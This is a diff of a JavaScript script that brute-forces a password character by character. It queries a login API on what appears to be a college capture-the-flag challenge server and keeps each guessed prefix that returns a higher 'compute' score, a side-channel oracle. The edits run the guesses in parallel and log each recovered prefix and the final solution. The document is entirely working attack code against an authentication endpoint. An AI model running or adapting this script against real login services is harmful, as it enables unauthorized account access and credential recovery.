@@ -1,5 +1,5 @@
 
-const CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}!-@$".split("");
+const CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_".split("");
 
 async function solve() {
 
@@ -10,25 +10,46 @@ async function solve() {
 
     while (updated) {
 
-        if (currentPassword) console.log(currentPassword);
-
         updated = false;
         
-        for (const char of CHARS) {
-            const result = await attempt(`${currentPassword}${char}`);
-            if (result === true) return;
-            else if (result > currentCompute) {
-                currentCompute = result;
-                currentPassword += char;
+        const tree = getTree(currentPassword);
+
+        const promises = tree.map(async (entry) => {
+            const result = await attempt(entry);
+            return { entry, result };
+        });
+
+        const results = await Promise.all(promises);
+
+        for (const item of results) {
+            if (item.result === true) {
+                currentPassword = item.entry;
+                console.log(currentPassword);
+                return;
+            }
+
+            if (item.result > currentCompute) {
+                currentCompute = item.result;
+                currentPassword = item.entry;
+                console.log(currentPassword);
                 updated = true;
-                break;
             }
         }
 
     }
-
-    console.log(currentCompute);
 }
+
+
+
+function getTree(pConfirmed) {
+    const tree = [];
+    for (const char of CHARS) {
+        tree.push(pConfirmed + char);
+    }
+    return tree;
+}
+
+
 
 async function attempt(pPasword) {
     const response = await fetch("https://omnisus-api.defi.info.cegepmontpetit.ca/api/Account/Login", {
@@ -53,7 +74,7 @@ async function attempt(pPasword) {
         }
     }
     else {
-        console.log(`Solution found: ${parsed}`);
+        console.log(`Solution found: ${JSON.stringify(parsed)}`);
         return true;
     }
 }
